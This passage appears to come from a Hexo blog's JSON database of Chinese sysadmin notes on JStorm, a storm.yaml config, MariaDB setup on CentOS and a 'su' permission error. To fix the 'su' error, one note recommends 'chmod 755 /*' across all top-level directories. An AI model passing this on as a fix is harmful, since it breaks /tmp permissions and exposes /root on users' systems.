==com.esotericsoftware.kryo.Kryo== 然后重新导入新包\n```\nimport com.alibaba.jstorm.esotericsoftware.kryo.Kryo;\nimport com.alibaba.jstorm.esotericsoftware.kryo.Serializer;\nimport com.alibaba.jstorm.esotericsoftware.kryo.io.Input;\nimport com.alibaba.jstorm.esotericsoftware.kryo.io.Output;\nimport com.alipay.dw.jstorm.example.sequence.bean.Pair;\n\n//import com.esotericsoftware.kryo.Kryo;\n//import com.esotericsoftware.kryo.Serializer;\n//import com.esotericsoftware.kryo.io.Input;\n//import com.esotericsoftware.kryo.io.Output;\n\n```\n\n","slug":"Jstrom/github  example报错","published":1,"updated":"2018-07-10T13:10:09.911Z","_id":"cjjedmh9x003m0gtjllnk2gva","comments":1,"layout":"post","photos":[],"link":"","content":"<p>注释掉 ==com.esotericsoftware.kryo.Kryo== 然后重新导入新包<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.Kryo;</span><br><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.Serializer;</span><br><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.io.Input;</span><br><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.io.Output;</span><br><span class=\"line\">import com.alipay.dw.jstorm.example.sequence.bean.Pair;</span><br><span class=\"line\"></span><br><span class=\"line\">//import com.esotericsoftware.kryo.Kryo;</span><br><span class=\"line\">//import com.esotericsoftware.kryo.Serializer;</span><br><span class=\"line\">//import com.esotericsoftware.kryo.io.Input;</span><br><span class=\"line\">//import com.esotericsoftware.kryo.io.Output;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>注释掉 ==com.esotericsoftware.kryo.Kryo== 然后重新导入新包<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.Kryo;</span><br><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.Serializer;</span><br><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.io.Input;</span><br><span class=\"line\">import com.alibaba.jstorm.esotericsoftware.kryo.io.Output;</span><br><span class=\"line\">import com.alipay.dw.jstorm.example.sequence.bean.Pair;</span><br><span class=\"line\"></span><br><span class=\"line\">//import com.esotericsoftware.kryo.Kryo;</span><br><span class=\"line\">//import com.esotericsoftware.kryo.Serializer;</span><br><span class=\"line\">//import com.esotericsoftware.kryo.io.Input;</span><br><span class=\"line\">//import com.esotericsoftware.kryo.io.Output;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"jstorm组件","date":"2018-07-10T13:09:19.000Z","_content":"- #### topology    \r\n一个JStorm任务\r\n\r\n- #### spout   \r\nspout代表输入的数据源，这个数据源可以是任意的，比如说kafka，DB，HBase，甚至是HDFS等，JStorm从这个数据源中不断地读取数据，然后发送到下游的bolt中进行处理。\r\n\r\n- #### bolt    \r\nbolt代表处理逻辑，bolt收到消息之后，对消息做处理（即执行用户的业务逻辑），处理完以后，既可以将处理后的消息继续发送到下游的bolt，这样会形成一个处理流水线（pipeline，不过更精确的应该是个有向图）；也可以直接结束。\r\n\r\n- #### component   \r\nspout 或者 bolt\r\n\r\n- #### worker  \r\n一个承载JStorm任务的进程。即为一个真正的操作系统执行进程，分布到一个集群的一台或者多台机器上并行执行。\r\n\r\n- #### task    \r\n执行pout和bolt的线程\r\n每个spout和bolt都可以单独指定一个并行度(parallelism)，代表同时有多少个线程(task)来执行这个spout或bolt。\r\n\r\n- #### 窗口    \r\n在流式计算中我们经常需要以时间或者数据量将无界的数据划分成一份份有限的集合，然后以这个集合为维度进行操作。比如我们会计算过去1个小时交易额TOP 10的天猫卖家，这时我会按照交易事件发生的时间将交易事件划分成到某个事件集合当中去，每个集合的大小是1个小时，然后计算每一个集合的TOP10。在流式计算中，这类的集合通常我们称之为Window。\r\n\r\n- #### [ack机制](http://120.25.204.125/ProgrammingGuide_cn/AdvancedUsage/Theory/Acker.html)     \r\nJStorm的acker机制，能够保证消息至少被处理一次（at least once）。也就是说，能够保证不丢消息。这里就详细解析一下acker的实现原理。","source":"_posts/Jstrom/jstorm组件.md","raw":"---\ntitle: jstorm组件\ndate: 2018-07-10 21:09:19\ntags: Jstrom\n---\n- #### topology    \r\n一个JStorm任务\r\n\r\n- #### spout   \r\nspout代表输入的数据源，这个数据源可以是任意的，比如说kafka，DB，HBase，甚至是HDFS等，JStorm从这个数据源中不断地读取数据，然后发送到下游的bolt中进行处理。\r\n\r\n- #### bolt    \r\nbolt代表处理逻辑，bolt收到消息之后，对消息做处理（即执行用户的业务逻辑），处理完以后，既可以将处理后的消息继续发送到下游的bolt，这样会形成一个处理流水线（pipeline，不过更精确的应该是个有向图）；也可以直接结束。\r\n\r\n- #### component   \r\nspout 或者 bolt\r\n\r\n- #### worker  \r\n一个承载JStorm任务的进程。即为一个真正的操作系统执行进程，分布到一个集群的一台或者多台机器上并行执行。\r\n\r\n- #### task    \r\n执行pout和bolt的线程\r\n每个spout和bolt都可以单独指定一个并行度(parallelism)，代表同时有多少个线程(task)来执行这个spout或bolt。\r\n\r\n- #### 窗口    \r\n在流式计算中我们经常需要以时间或者数据量将无界的数据划分成一份份有限的集合，然后以这个集合为维度进行操作。比如我们会计算过去1个小时交易额TOP 10的天猫卖家，这时我会按照交易事件发生的时间将交易事件划分成到某个事件集合当中去，每个集合的大小是1个小时，然后计算每一个集合的TOP10。在流式计算中，这类的集合通常我们称之为Window。\r\n\r\n- #### [ack机制](http://120.25.204.125/ProgrammingGuide_cn/AdvancedUsage/Theory/Acker.html)     \r\nJStorm的acker机制，能够保证消息至少被处理一次（at least once）。也就是说，能够保证不丢消息。这里就详细解析一下acker的实现原理。","slug":"Jstrom/jstorm组件","published":1,"updated":"2018-07-10T13:10:09.912Z","_id":"cjjedmh9y003o0gtjg7rb1wfv","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"topology\"><a href=\"#topology\" class=\"headerlink\" title=\"topology\"></a>topology</h4><p>一个JStorm任务</p>\n</li>\n<li><h4 id=\"spout\"><a href=\"#spout\" class=\"headerlink\" title=\"spout\"></a>spout</h4><p>spout代表输入的数据源，这个数据源可以是任意的，比如说kafka，DB，HBase，甚至是HDFS等，JStorm从这个数据源中不断地读取数据，然后发送到下游的bolt中进行处理。</p>\n</li>\n<li><h4 id=\"bolt\"><a href=\"#bolt\" class=\"headerlink\" title=\"bolt\"></a>bolt</h4><p>bolt代表处理逻辑，bolt收到消息之后，对消息做处理（即执行用户的业务逻辑），处理完以后，既可以将处理后的消息继续发送到下游的bolt，这样会形成一个处理流水线（pipeline，不过更精确的应该是个有向图）；也可以直接结束。</p>\n</li>\n<li><h4 id=\"component\"><a href=\"#component\" class=\"headerlink\" title=\"component\"></a>component</h4><p>spout 或者 bolt</p>\n</li>\n<li><h4 id=\"worker\"><a href=\"#worker\" class=\"headerlink\" title=\"worker\"></a>worker</h4><p>一个承载JStorm任务的进程。即为一个真正的操作系统执行进程，分布到一个集群的一台或者多台机器上并行执行。</p>\n</li>\n<li><h4 id=\"task\"><a href=\"#task\" class=\"headerlink\" title=\"task\"></a>task</h4><p>执行pout和bolt的线程<br>每个spout和bolt都可以单独指定一个并行度(parallelism)，代表同时有多少个线程(task)来执行这个spout或bolt。</p>\n</li>\n<li><h4 id=\"窗口\"><a href=\"#窗口\" class=\"headerlink\" title=\"窗口\"></a>窗口</h4><p>在流式计算中我们经常需要以时间或者数据量将无界的数据划分成一份份有限的集合，然后以这个集合为维度进行操作。比如我们会计算过去1个小时交易额TOP 10的天猫卖家，这时我会按照交易事件发生的时间将交易事件划分成到某个事件集合当中去，每个集合的大小是1个小时，然后计算每一个集合的TOP10。在流式计算中，这类的集合通常我们称之为Window。</p>\n</li>\n<li><h4 id=\"ack机制\"><a href=\"#ack机制\" class=\"headerlink\" title=\"ack机制\"></a><a href=\"http://120.25.204.125/ProgrammingGuide_cn/AdvancedUsage/Theory/Acker.html\" target=\"_blank\" rel=\"noopener\">ack机制</a></h4><p>JStorm的acker机制，能够保证消息至少被处理一次（at least once）。也就是说，能够保证不丢消息。这里就详细解析一下acker的实现原理。</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"topology\"><a href=\"#topology\" class=\"headerlink\" title=\"topology\"></a>topology</h4><p>一个JStorm任务</p>\n</li>\n<li><h4 id=\"spout\"><a href=\"#spout\" class=\"headerlink\" title=\"spout\"></a>spout</h4><p>spout代表输入的数据源，这个数据源可以是任意的，比如说kafka，DB，HBase，甚至是HDFS等，JStorm从这个数据源中不断地读取数据，然后发送到下游的bolt中进行处理。</p>\n</li>\n<li><h4 id=\"bolt\"><a href=\"#bolt\" class=\"headerlink\" title=\"bolt\"></a>bolt</h4><p>bolt代表处理逻辑，bolt收到消息之后，对消息做处理（即执行用户的业务逻辑），处理完以后，既可以将处理后的消息继续发送到下游的bolt，这样会形成一个处理流水线（pipeline，不过更精确的应该是个有向图）；也可以直接结束。</p>\n</li>\n<li><h4 id=\"component\"><a href=\"#component\" class=\"headerlink\" title=\"component\"></a>component</h4><p>spout 或者 bolt</p>\n</li>\n<li><h4 id=\"worker\"><a href=\"#worker\" class=\"headerlink\" title=\"worker\"></a>worker</h4><p>一个承载JStorm任务的进程。即为一个真正的操作系统执行进程，分布到一个集群的一台或者多台机器上并行执行。</p>\n</li>\n<li><h4 id=\"task\"><a href=\"#task\" class=\"headerlink\" title=\"task\"></a>task</h4><p>执行pout和bolt的线程<br>每个spout和bolt都可以单独指定一个并行度(parallelism)，代表同时有多少个线程(task)来执行这个spout或bolt。</p>\n</li>\n<li><h4 id=\"窗口\"><a href=\"#窗口\" class=\"headerlink\" title=\"窗口\"></a>窗口</h4><p>在流式计算中我们经常需要以时间或者数据量将无界的数据划分成一份份有限的集合，然后以这个集合为维度进行操作。比如我们会计算过去1个小时交易额TOP 10的天猫卖家，这时我会按照交易事件发生的时间将交易事件划分成到某个事件集合当中去，每个集合的大小是1个小时，然后计算每一个集合的TOP10。在流式计算中，这类的集合通常我们称之为Window。</p>\n</li>\n<li><h4 id=\"ack机制\"><a href=\"#ack机制\" class=\"headerlink\" title=\"ack机制\"></a><a href=\"http://120.25.204.125/ProgrammingGuide_cn/AdvancedUsage/Theory/Acker.html\" target=\"_blank\" rel=\"noopener\">ack机制</a></h4><p>JStorm的acker机制，能够保证消息至少被处理一次（at least once）。也就是说，能够保证不丢消息。这里就详细解析一下acker的实现原理。</p>\n</li>\n</ul>\n"},{"title":"supervisor启动失败","date":"2018-07-10T13:09:19.000Z","_content":"在jstorm的安装目录下\n```\ncat conf/storm.yaml\n \njstorm.log.dir: /opt/rt/data/jstorm/logs\nnimbus.host: 10.20.28.67\nstorm.local.dir: /opt/rt/data/jstorm/data\nstorm.zookeeper.root: /hs_jstorm\nstorm.zookeeper.servers: [hs01]\nnimbus.childopts: -Xms2g -Xmx2g -Xmn768m -XX:SurvivorRatio=4 -XX:MaxTenuringThreshold=15 -XX:+UseConcMarkSweepGC -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+HeapDumpOnOutOfMemoryError -XX:CMSMaxAbortablePrecleanTime=5000\n```\n备份，删除storm.local.dir下的文件，然后重启","source":"_posts/Jstrom/supervisor启动失败.md","raw":"---\ntitle: supervisor启动失败\ndate: 2018-07-10 21:09:19\ntags: Jstrom\n---\n在jstorm的安装目录下\n```\ncat conf/storm.yaml\n \njstorm.log.dir: /opt/rt/data/jstorm/logs\nnimbus.host: 10.20.28.67\nstorm.local.dir: /opt/rt/data/jstorm/data\nstorm.zookeeper.root: /hs_jstorm\nstorm.zookeeper.servers: [hs01]\nnimbus.childopts: -Xms2g -Xmx2g -Xmn768m -XX:SurvivorRatio=4 -XX:MaxTenuringThreshold=15 -XX:+UseConcMarkSweepGC -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+HeapDumpOnOutOfMemoryError -XX:CMSMaxAbortablePrecleanTime=5000\n```\n备份，删除storm.local.dir下的文件，然后重启","slug":"Jstrom/supervisor启动失败","published":1,"updated":"2018-07-10T13:10:09.914Z","_id":"cjjedmh9z003r0gtjyqnr8mxh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在jstorm的安装目录下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat conf/storm.yaml</span><br><span class=\"line\"> </span><br><span class=\"line\">jstorm.log.dir: /opt/rt/data/jstorm/logs</span><br><span class=\"line\">nimbus.host: 10.20.28.67</span><br><span class=\"line\">storm.local.dir: /opt/rt/data/jstorm/data</span><br><span class=\"line\">storm.zookeeper.root: /hs_jstorm</span><br><span class=\"line\">storm.zookeeper.servers: [hs01]</span><br><span class=\"line\">nimbus.childopts: -Xms2g -Xmx2g -Xmn768m -XX:SurvivorRatio=4 -XX:MaxTenuringThreshold=15 -XX:+UseConcMarkSweepGC -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+HeapDumpOnOutOfMemoryError -XX:CMSMaxAbortablePrecleanTime=5000</span><br></pre></td></tr></table></figure></p>\n<p>备份，删除storm.local.dir下的文件，然后重启</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在jstorm的安装目录下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat conf/storm.yaml</span><br><span class=\"line\"> </span><br><span class=\"line\">jstorm.log.dir: /opt/rt/data/jstorm/logs</span><br><span class=\"line\">nimbus.host: 10.20.28.67</span><br><span class=\"line\">storm.local.dir: /opt/rt/data/jstorm/data</span><br><span class=\"line\">storm.zookeeper.root: /hs_jstorm</span><br><span class=\"line\">storm.zookeeper.servers: [hs01]</span><br><span class=\"line\">nimbus.childopts: -Xms2g -Xmx2g -Xmn768m -XX:SurvivorRatio=4 -XX:MaxTenuringThreshold=15 -XX:+UseConcMarkSweepGC -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+HeapDumpOnOutOfMemoryError -XX:CMSMaxAbortablePrecleanTime=5000</span><br></pre></td></tr></table></figure></p>\n<p>备份，删除storm.local.dir下的文件，然后重启</p>\n"},{"title":"Linux 下MySQL安装卸载","date":"2018-07-10T13:09:19.000Z","_content":"[卸载](http://www.cnblogs.com/kerrycode/p/4364465.html)\n[安装](https://www.cnblogs.com/starof/p/4680083.html)\n#### 1.环境\ncentos 6.5\n#### 2.安装\n```\n yum install -y mysql-server mysql mysql-deve\n```\n##### 报错：\n```\nLoading mirror speeds from cached hostfile\n * base: mirrors.163.com\n * extras: mirror.bit.edu.cn\n * updates: mirror.bit.edu.cn\n没有可用软件包 mysql-server。\n错误：无须任何处理\n```\n##### 原因：\n> CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替了。\nMariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。\n\n##### 解决办法：\n\n安装mariadb\n```\nyum install mariadb-server mariadb \n```\n##### mariadb数据库的相关命令:\n\n\n\n命令| 说明\n---|---\nsystemctl start mariadb | #启动MariaDB\nsystemctl stop mariadb  | #停止MariaDB\nsystemctl restart mariadb | #重启MariaDB\nsystemctl enable mariadb | #设置开机启动\n\nmariadb和mysql命令大部分一致，第一次登陆使用\n\n    mysql -u root -p\n密码是空直接enter\n\n#### 链接：\n\n[centos7 mysql数据库安装和配置](https://www.cnblogs.com/starof/p/4680083.html)\n\n[CentOS6.4下Mysql数据库的安装与配置](http://www.cnblogs.com/xiaoluo501395377/archive/2013/04/07/3003278.html)","source":"_posts/Linux/Linux 下MySQL安装卸载.md","raw":"---\ntitle: Linux 下MySQL安装卸载\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n[卸载](http://www.cnblogs.com/kerrycode/p/4364465.html)\n[安装](https://www.cnblogs.com/starof/p/4680083.html)\n#### 1.环境\ncentos 6.5\n#### 2.安装\n```\n yum install -y mysql-server mysql mysql-deve\n```\n##### 报错：\n```\nLoading mirror speeds from cached hostfile\n * base: mirrors.163.com\n * extras: mirror.bit.edu.cn\n * updates: mirror.bit.edu.cn\n没有可用软件包 mysql-server。\n错误：无须任何处理\n```\n##### 原因：\n> CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替了。\nMariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。\n\n##### 解决办法：\n\n安装mariadb\n```\nyum install mariadb-server mariadb \n```\n##### mariadb数据库的相关命令:\n\n\n\n命令| 说明\n---|---\nsystemctl start mariadb | #启动MariaDB\nsystemctl stop mariadb  | #停止MariaDB\nsystemctl restart mariadb | #重启MariaDB\nsystemctl enable mariadb | #设置开机启动\n\nmariadb和mysql命令大部分一致，第一次登陆使用\n\n    mysql -u root -p\n密码是空直接enter\n\n#### 链接：\n\n[centos7 mysql数据库安装和配置](https://www.cnblogs.com/starof/p/4680083.html)\n\n[CentOS6.4下Mysql数据库的安装与配置](http://www.cnblogs.com/xiaoluo501395377/archive/2013/04/07/3003278.html)","slug":"Linux/Linux 下MySQL安装卸载","published":1,"updated":"2018-07-10T13:10:09.925Z","_id":"cjjedmha0003t0gtjgkct7k8j","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://www.cnblogs.com/kerrycode/p/4364465.html\" target=\"_blank\" rel=\"noopener\">卸载</a><br><a href=\"https://www.cnblogs.com/starof/p/4680083.html\" target=\"_blank\" rel=\"noopener\">安装</a></p>\n<h4 id=\"1-环境\"><a href=\"#1-环境\" class=\"headerlink\" title=\"1.环境\"></a>1.环境</h4><p>centos 6.5</p>\n<h4 id=\"2-安装\"><a href=\"#2-安装\" class=\"headerlink\" title=\"2.安装\"></a>2.安装</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y mysql-server mysql mysql-deve</span><br></pre></td></tr></table></figure>\n<h5 id=\"报错：\"><a href=\"#报错：\" class=\"headerlink\" title=\"报错：\"></a>报错：</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\"> * base: mirrors.163.com</span><br><span class=\"line\"> * extras: mirror.bit.edu.cn</span><br><span class=\"line\"> * updates: mirror.bit.edu.cn</span><br><span class=\"line\">没有可用软件包 mysql-server。</span><br><span class=\"line\">错误：无须任何处理</span><br></pre></td></tr></table></figure>\n<h5 id=\"原因：\"><a href=\"#原因：\" class=\"headerlink\" title=\"原因：\"></a>原因：</h5><blockquote>\n<p>CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替了。<br>MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。</p>\n</blockquote>\n<h5 id=\"解决办法：\"><a href=\"#解决办法：\" class=\"headerlink\" title=\"解决办法：\"></a>解决办法：</h5><p>安装mariadb<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install mariadb-server mariadb</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"mariadb数据库的相关命令\"><a href=\"#mariadb数据库的相关命令\" class=\"headerlink\" title=\"mariadb数据库的相关命令:\"></a>mariadb数据库的相关命令:</h5><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>systemctl start mariadb</td>\n<td>#启动MariaDB</td>\n</tr>\n<tr>\n<td>systemctl stop mariadb</td>\n<td>#停止MariaDB</td>\n</tr>\n<tr>\n<td>systemctl restart mariadb</td>\n<td>#重启MariaDB</td>\n</tr>\n<tr>\n<td>systemctl enable mariadb</td>\n<td>#设置开机启动</td>\n</tr>\n</tbody>\n</table>\n<p>mariadb和mysql命令大部分一致，第一次登陆使用</p>\n<pre><code>mysql -u root -p\n</code></pre><p>密码是空直接enter</p>\n<h4 id=\"链接：\"><a href=\"#链接：\" class=\"headerlink\" title=\"链接：\"></a>链接：</h4><p><a href=\"https://www.cnblogs.com/starof/p/4680083.html\" target=\"_blank\" rel=\"noopener\">centos7 mysql数据库安装和配置</a></p>\n<p><a href=\"http://www.cnblogs.com/xiaoluo501395377/archive/2013/04/07/3003278.html\" target=\"_blank\" rel=\"noopener\">CentOS6.4下Mysql数据库的安装与配置</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.cnblogs.com/kerrycode/p/4364465.html\" target=\"_blank\" rel=\"noopener\">卸载</a><br><a href=\"https://www.cnblogs.com/starof/p/4680083.html\" target=\"_blank\" rel=\"noopener\">安装</a></p>\n<h4 id=\"1-环境\"><a href=\"#1-环境\" class=\"headerlink\" title=\"1.环境\"></a>1.环境</h4><p>centos 6.5</p>\n<h4 id=\"2-安装\"><a href=\"#2-安装\" class=\"headerlink\" title=\"2.安装\"></a>2.安装</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y mysql-server mysql mysql-deve</span><br></pre></td></tr></table></figure>\n<h5 id=\"报错：\"><a href=\"#报错：\" class=\"headerlink\" title=\"报错：\"></a>报错：</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\"> * base: mirrors.163.com</span><br><span class=\"line\"> * extras: mirror.bit.edu.cn</span><br><span class=\"line\"> * updates: mirror.bit.edu.cn</span><br><span class=\"line\">没有可用软件包 mysql-server。</span><br><span class=\"line\">错误：无须任何处理</span><br></pre></td></tr></table></figure>\n<h5 id=\"原因：\"><a href=\"#原因：\" class=\"headerlink\" title=\"原因：\"></a>原因：</h5><blockquote>\n<p>CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替了。<br>MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。</p>\n</blockquote>\n<h5 id=\"解决办法：\"><a href=\"#解决办法：\" class=\"headerlink\" title=\"解决办法：\"></a>解决办法：</h5><p>安装mariadb<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install mariadb-server mariadb</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"mariadb数据库的相关命令\"><a href=\"#mariadb数据库的相关命令\" class=\"headerlink\" title=\"mariadb数据库的相关命令:\"></a>mariadb数据库的相关命令:</h5><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>systemctl start mariadb</td>\n<td>#启动MariaDB</td>\n</tr>\n<tr>\n<td>systemctl stop mariadb</td>\n<td>#停止MariaDB</td>\n</tr>\n<tr>\n<td>systemctl restart mariadb</td>\n<td>#重启MariaDB</td>\n</tr>\n<tr>\n<td>systemctl enable mariadb</td>\n<td>#设置开机启动</td>\n</tr>\n</tbody>\n</table>\n<p>mariadb和mysql命令大部分一致，第一次登陆使用</p>\n<pre><code>mysql -u root -p\n</code></pre><p>密码是空直接enter</p>\n<h4 id=\"链接：\"><a href=\"#链接：\" class=\"headerlink\" title=\"链接：\"></a>链接：</h4><p><a href=\"https://www.cnblogs.com/starof/p/4680083.html\" target=\"_blank\" rel=\"noopener\">centos7 mysql数据库安装和配置</a></p>\n<p><a href=\"http://www.cnblogs.com/xiaoluo501395377/archive/2013/04/07/3003278.html\" target=\"_blank\" rel=\"noopener\">CentOS6.4下Mysql数据库的安装与配置</a></p>\n"},{"title":"分组","date":"2018-07-10T13:09:19.000Z","_content":"http://wsztrush.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/2015/07/31/Jstorm.html\n\nhttp://www.cnblogs.com/xymqx/p/4365190.html","source":"_posts/Jstrom/分组.md","raw":"---\ntitle: 分组\ndate: 2018-07-10 21:09:19\ntags: Jstrom\n---\nhttp://wsztrush.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/2015/07/31/Jstorm.html\n\nhttp://www.cnblogs.com/xymqx/p/4365190.html","slug":"Jstrom/分组","published":1,"updated":"2018-07-10T13:10:09.916Z","_id":"cjjedmha1003v0gtj2j6mmr9q","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://wsztrush.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/2015/07/31/Jstorm.html\" target=\"_blank\" rel=\"noopener\">http://wsztrush.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/2015/07/31/Jstorm.html</a></p>\n<p><a href=\"http://www.cnblogs.com/xymqx/p/4365190.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/xymqx/p/4365190.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://wsztrush.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/2015/07/31/Jstorm.html\" target=\"_blank\" rel=\"noopener\">http://wsztrush.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/2015/07/31/Jstorm.html</a></p>\n<p><a href=\"http://www.cnblogs.com/xymqx/p/4365190.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/xymqx/p/4365190.html</a></p>\n"},{"title":"root 下su othersuer报错su }bin}bash permission denied","date":"2018-07-10T13:09:19.000Z","_content":"原因是su这个命令在执行的时候会调用其他目录下的程序\n\n如果修改了某个可能被调用的目录权限，比如\n\n    chmod 750 /*\n再调用su命令的时候就会报错了\n\n因为不知道具体是哪个目录的权限问题所以最简单的解决的方法是\n\n    chmod 755 /*","source":"_posts/Linux/root 下su othersuer报错su }bin}bash permission denied.md","raw":"---\ntitle: root 下su othersuer报错su }bin}bash permission denied\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n原因是su这个命令在执行的时候会调用其他目录下的程序\n\n如果修改了某个可能被调用的目录权限，比如\n\n    chmod 750 /*\n再调用su命令的时候就会报错了\n\n因为不知道具体是哪个目录的权限问题所以最简单的解决的方法是\n\n    chmod 755 /*","slug":"Linux/root 下su othersuer报错su }bin}bash permission denied","published":1,"updated":"2018-07-10T13:10:09.925Z","_id":"cjjedmha2003y0gtjqqydd5oh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>原因是su这个命令在执行的时候会调用其他目录下的程序</p>\n<p>如果修改了某个可能被调用的目录权限，比如</p>\n<pre><code>chmod 750 /*\n</code></pre><p>再调用su命令的时候就会报错了</p>\n<p>因为不知道具体是哪个目录的权限问题所以最简单的解决的方法是</p>\n<pre><code>chmod 755 /*\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>原因是su这个命令在执行的时候会调用其他目录下的程序</p>\n<p>如果修改了某个可能被调用的目录权限，比如</p>\n<pre><code>chmod 750 /*\n</code></pre><p>再调用su命令的时候就会报错了</p>\n<p>因为不知道具体是哪个目录的权限问题所以最简单的解决的方法是</p>\n<pre><code>chmod 755 /*\n</code></pre>"},{"title":"less用法","date":"2018-07-10T13:09:19.000Z","_content":"less --help\n```\n  e  ^E  j  ^N  CR  *  Forward  one line   (or N 